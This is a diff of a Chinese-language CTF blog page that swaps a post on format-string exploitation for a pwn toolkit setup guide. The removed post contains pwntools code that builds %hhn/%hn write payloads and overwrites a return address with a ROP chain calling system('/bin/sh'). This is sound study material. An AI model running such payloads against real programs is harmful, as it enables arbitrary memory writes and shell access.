@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="《格式化字符串》, StarrySky">
+    <meta name="keywords" content="pwn环境配置, StarrySky">
     <meta name="description" content="Love rises from the east and descends to the west,romance makes no changes until death.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>《格式化字符串》 | StarrySky</title>
+    <title>pwn环境配置 | StarrySky</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -231,7 +231,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">《格式化字符串》</h1>
+                    <h1 class="description center-align post-title">pwn环境配置</h1>
                 </div>
             </div>
         </div>
@@ -351,10 +351,6 @@
                                 <span class="chip bg-color">pwn</span>
                             </a>
                         
-                            <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
-                                <span class="chip bg-color">格式化字符串</span>
-                            </a>
-                        
                     </div>
                     
                 </div>
@@ -376,7 +372,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-06-20
+                    2024-10-05
                 </div>
                 
 
@@ -385,14 +381,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    917
+                    609
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    3 分
                 </div>
                 
 
@@ -410,116 +406,116 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h2><pre class="line-numbers language-none"><code class="language-none">%[parameter][flags][field width][.precision][length]type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <p>视频版：</p>
+<h2 id="更新、安装vim"><a href="#更新、安装vim" class="headerlink" title="更新、安装vim"></a>更新、安装vim</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> upgrade
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">vim</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<ul>
-<li>使用以<code>%</code>开头的格式说明符占位，在后面参数列表中提供相应变量</li>
-<li><code>c</code>，把 int 参数转为 unsigned char 型输出</li>
-<li><code>p</code>， void * 型，printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址</li>
-<li><code>n</code>，不输出字符，将该字符之前的字符数量写入参数中</li>
-</ul>
-<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p>
-<ul>
-<li>泄露栈内存<ul>
-<li>获取某个变量的值</li>
-<li>获取某个变量对应地址的内存</li>
-</ul>
-</li>
-<li>泄露任意地址内存<ul>
-<li>利用 <code>GOT</code> 表得到 <code>libc</code> 函数地址，进而获取 <code>libc</code>，进而获取其它 <code>libc</code> 函数地址</li>
-<li>盲打，<code>dump</code> 整个程序，获取有用信息。</li>
-</ul>
-</li>
-</ul>
-<h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>payload：<code>‘%’ + str(target_addr) + &#39;c%offset$n&#39;</code></p>
-<ul>
-<li><code>hhn</code>:1字节（2位</li>
-<li><code>hn</code>：2字节（4位</li>
-<li><code>n</code>：4字节（8位</li>
-</ul>
-<h3 id="栈上的格式化字符串"><a href="#栈上的格式化字符串" class="headerlink" title="栈上的格式化字符串"></a>栈上的格式化字符串</h3><h4 id="确定偏移offset"><a href="#确定偏移offset" class="headerlink" title="确定偏移offset"></a>确定偏移offset</h4><p>在<code>printf</code>下断点，利用<code>fmtarg</code>工具获取偏移</p>
-<h4 id="修改内存函数基本构造"><a href="#修改内存函数基本构造" class="headerlink" title="修改内存函数基本构造"></a>修改内存函数基本构造</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt1</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>
-        result <span class="token operator">=</span> word <span class="token operator">-</span> prev
-        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
-    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>
-        result <span class="token operator">=</span> <span class="token number">0</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev
-        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
-    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>
-    <span class="token keyword">return</span> fmtstr
+<h2 id="安装必要环境"><a href="#安装必要环境" class="headerlink" title="安装必要环境"></a>安装必要环境</h2><p>将一下内容写入一个<code>sh</code>脚本文件中，为<code>chmoe 777 xxx.sh</code>文件赋权限后直接<code>./xxx.sh</code>运行脚本，中途会出现<code>Do you want to continue? [Y/n]</code>输入<code>y</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+<span class="token builtin class-name">cd</span> ~
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> tzdata
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">vim</span>
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libxml2-dev
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libxslt-dev
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libmysqlclient-dev
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libsqlite3-dev
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> zlib1g-dev
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python2-dev
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python3-pip
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libffi-dev
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libssl-dev
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">wget</span>
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">curl</span>
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gcc
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> clang
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">make</span>
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">zip</span>
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> build-essential
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libncursesw5-dev libgdbm-dev libc6-dev
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> tk-dev
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openssl
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> virtualenv
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span>
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> proxychains4
+<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ruby-dev
 
+<span class="token comment">#setuptools 36.6.1 -> python2</span>
+<span class="token function">wget</span> https://mirrors.aliyun.com/pypi/packages/56/a0/4dfcc515b1b993286a64b9ab62562f09e6ed2d09288909aee1efdb9dde16/setuptools-36.6.1.zip
+<span class="token function">unzip</span> setuptools-36.6.1.zip
+<span class="token builtin class-name">cd</span> setuptools-36.6.1
+<span class="token function">sudo</span> python2 setup.py <span class="token function">install</span>
+<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/
+<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> setuptools-36.6.1 setuptools-36.6.1.zip
 
-<span class="token keyword">def</span> <span class="token function">fmt2</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    payload <span class="token operator">=</span> <span class="token string">""</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
-            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
-    prev <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>
-        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>
-    <span class="token keyword">return</span> payload
-payload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment">#setuptools 65.4.1 -> python3</span>
+<span class="token function">wget</span> https://mirrors.aliyun.com/pypi/packages/03/c9/7b050ea4cc4144d0328f15e0b43c839e759c6c639370a3b932ecf4c6358f/setuptools-65.4.1.tar.gz
+<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> setuptools-65.4.1.tar.gz
+<span class="token builtin class-name">cd</span> setuptools-65.4.1
+<span class="token function">sudo</span> python3 setup.py <span class="token function">install</span>
+<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/
+<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> setuptools-65.4.1 setuptools-65.4.1.tar.gz
 
-<p>32位时自带函数：<code>fmtstr_payload(偏移，&#123;被改的got：要改的plt&#125;)</code></p>
-<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul>
-<li>泄露libc等所需地址</li>
-<li>将需要修改的地址写入栈</li>
-<li>获取写入</li>
-</ul>
-<h3 id="非栈上格式化字符串漏洞"><a href="#非栈上格式化字符串漏洞" class="headerlink" title="非栈上格式化字符串漏洞"></a>非栈上格式化字符串漏洞</h3><p>技巧：1.改<code>ret</code>地址中的<code>libc_start_main</code>为<code>ogg</code></p>
-<p>​          2.改<code>printf_got</code>为<code>system/ogg</code></p>
-<p>​          3.泄露<code>stack</code>地址的时候如果<code>ebp</code>地址不对就用和<code>ebp</code>连接的地址一样的地址</p>
-<pre class="line-numbers language-none"><code class="language-none">sys1 &#x3D; system &amp; 0xff #取低字节
-sys2 &#x3D; (system&gt;&gt;8) &amp; 0xffff #取第二三字节 
-gift_addr &#x3D; gift &amp; 0xffff #取低二字节
-p4 &#x3D; &#39;%&#39; + str(sys1) + &#39;c%8$hhn&#39; + &#39;%&#39; + str((gift_addr) - (sys1)) + &#39;c%9$hn&#39; + &#39;%&#39; + str(sys2-gift_addr) + &#39;c%10$hn&#39; 
-r.sendlineafter(&#39;gift for you: \n&#39;,p4)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment">#pip</span>
+<span class="token function">wget</span> https://mirrors.aliyun.com/pypi/packages/53/7f/55721ad0501a9076dbc354cc8c63ffc2d6f1ef360f49ad0fbcce19d68538/pip-20.3.4.tar.gz
+<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> pip-20.3.4.tar.gz
+<span class="token builtin class-name">cd</span> pip-20.3.4
+<span class="token function">sudo</span> python2 setup.py <span class="token function">install</span>
+<span class="token function">sudo</span> python3 setup.py <span class="token function">install</span>
+<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/
+<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> pip-20.3.4 pip-20.3.4.tar.gz
 
-<p>若需分两次改则需要两条链，当第二次发送的数据小于第一次发送的数据时，要加<code>0x10000</code></p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述（1）与（2）两个栈地址在格式化字符串中的偏移</span>
-<span class="token keyword">def</span> <span class="token function">overlap</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span>ptr<span class="token punctuation">,</span>off1<span class="token punctuation">,</span>off2<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    d<span class="token operator">=</span>dest<span class="token operator">&amp;</span><span class="token number">0xff</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> <span class="token keyword">not</span> ptr<span class="token punctuation">:</span>
-            <span class="token keyword">break</span>
-        payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hhn'</span>
-        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-        f<span class="token operator">=</span>ptr<span class="token operator">&amp;</span><span class="token number">0xff</span>
-        payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off2<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hhn'</span>
-        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-        d<span class="token operator">+=</span><span class="token number">1</span>
-        ptr<span class="token operator">>></span><span class="token operator">=</span><span class="token number">8</span>
+<span class="token function">sudo</span> pip2 config <span class="token builtin class-name">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple
+<span class="token function">sudo</span> pip3 config <span class="token builtin class-name">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple
 
-ret<span class="token operator">=</span>rsp<span class="token operator">+</span><span class="token number">0x18</span>
-ptr<span class="token operator">=</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x21112</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token comment">#通过将第25个参数传入格式化字符串，将第39个参数的值改为返回地址</span>
-payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>ret<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hn'</span>
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-<span class="token comment">#覆盖返回地址为ptr（pop_rdi; ret）</span>
-overlap<span class="token punctuation">(</span>ret<span class="token punctuation">,</span>ptr<span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span>
-<span class="token comment">#覆盖返回地址+8的位置为binsh字符串地址</span>
-overlap<span class="token punctuation">(</span>ret<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span>
-<span class="token comment">#覆盖返回地址+16的位置为system函数的地址</span>
-overlap<span class="token punctuation">(</span>ret<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span>
-<span class="token comment">#至此，退出循环执行ROP后即可获取系统操作权限</span>
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token function">sudo</span> python2 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip
+<span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip
 
-<ul>
-<li><p>泄露<code>libc</code>：<code>__libc_start_main</code></p>
-</li>
-<li><p>修改：<code>payload = (b&#39;%&#39; + bytes(str(one1), encoding=&#39;utf-8&#39;) + b&#39;c%8$hn&#39;).ljust(16, b&#39;a&#39;) + p64(exit_addr)</code>，分多次修改每次<code>sleep(0.5)</code></p>
-</li>
-<li><pre><code class="python">num = 12345
-num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
-</code></pre>
-</li>
-</ul>
+pip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip
+<span class="token function">sudo</span> pip2 <span class="token function">install</span> pathlib2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="配置pwn环境"><a href="#配置pwn环境" class="headerlink" title="配置pwn环境"></a>配置pwn环境</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python2 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pwntools
+<span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="pwndbg-Pwngdb"><a href="#pwndbg-Pwngdb" class="headerlink" title="pwndbg+Pwngdb"></a>pwndbg+Pwngdb</h3><p>这里我直接去<code>github</code>下载运行<code>setup.sh</code>会报错要求升级<code>python3</code>，所以直接把原来虚拟机里的打包复制过来了</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://starrysky1004.github.io/pwnenv.zip
+<span class="token function">unzip</span> pwnenv.zip
+<span class="token function">cp</span> ~/pwnenv/pwndbg ./
+<span class="token function">cp</span> ~/pwnenv/Pwngdb ./
+<span class="token function">rm</span> <span class="token parameter variable">-r</span> pwnenv
+<span class="token function">rm</span> pwnenv.zip
+
+<span class="token comment">#pwndbg</span>
+<span class="token function">git</span> clone https://github.91chi.fun/https://github.com/pwndbg/pwndbg.git
+<span class="token builtin class-name">cd</span> pwndbg
+./setup.sh
+<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/
+
+<span class="token comment">#Pwngdb</span>
+<span class="token builtin class-name">cd</span> ~/
+<span class="token function">git</span> clone https://github.com/scwuaptx/Pwngdb.git 
+<span class="token function">cp</span> ~/Pwngdb/.gdbinit ~/
+
+<span class="token function">vim</span> ~/.gdbinit
+<span class="token comment">#注释掉第一行 然后在第二行写入</span>
+<span class="token builtin class-name">source</span> ~/pwndbg/gdbinit.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> patchelf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#glibc-all-in-one</span>
+<span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git
+<span class="token builtin class-name">cd</span> glibc-all-in-one
+python3 update_list
+<span class="token function">cat</span> list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pip3 <span class="token function">install</span> capstone filebytes unicorn keystone-engine ropper<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu-system"></a>qemu-system</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Ropgadget"><a href="#Ropgadget" class="headerlink" title="Ropgadget"></a>Ropgadget</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-H</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> ROPgadget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="one-gadget、seccomp-tools"><a href="#one-gadget、seccomp-tools" class="headerlink" title="one_gadget、seccomp-tools"></a>one_gadget、seccomp-tools</h3><p>这两个我感觉很随缘，没事运行一下看运气吧（</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget
+<span class="token function">sudo</span> gem <span class="token function">install</span> seccomp-tools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
                 
             </div>
@@ -536,10 +532,6 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
                             
                                 <a href="/tags/pwn/">
                                     <span class="chip bg-color">pwn</span>
-                                </a>
-                            
-                                <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
-                                    <span class="chip bg-color">格式化字符串</span>
                                 </a>
                             
                         </div>
@@ -580,46 +572,48 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/07/12/leetcode-shua-ti-chi-xu-geng-xin/leetcode-shua-ti-chi-xu-geng-xin/">
+                <a href="/2024/10/05/pwn-huan-jing-pei-zhi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/Steel%20Gray.jpg" class="responsive-img" alt="leetcode刷题（持续更新)">
+                        <img src="/medias/featureimages/Steel%20Gray.jpg" class="responsive-img" alt="pwn环境配置">
                         
-                        <span class="card-title">leetcode刷题（持续更新)</span>
+                        <span class="card-title">pwn环境配置</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            leetcode刷题记录
+                            pwn环境配置
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-10-05
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%AE%97%E6%B3%95/" class="post-category">
-                                    算法
+                            <a href="/categories/pwn/" class="post-category">
+                                    pwn
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%AE%97%E6%B3%95/">
-                        <span class="chip bg-color">算法</span>
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
                     </a>
                     
                 </div>
@@ -633,31 +627,31 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/">
+                <a href="/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/Steel%20Gray.jpg" class="responsive-img" alt="《CSAPP》阅读笔记（持续更新）">
+                        <img src="/medias/featureimages/Steel%20Gray.jpg" class="responsive-img" alt="Linux延迟绑定机制过程">
                         
-                        <span class="card-title">《CSAPP》阅读笔记（持续更新）</span>
+                        <span class="card-title">Linux延迟绑定机制过程</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            深入理解计算机系统笔记
+                            延迟绑定过程
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
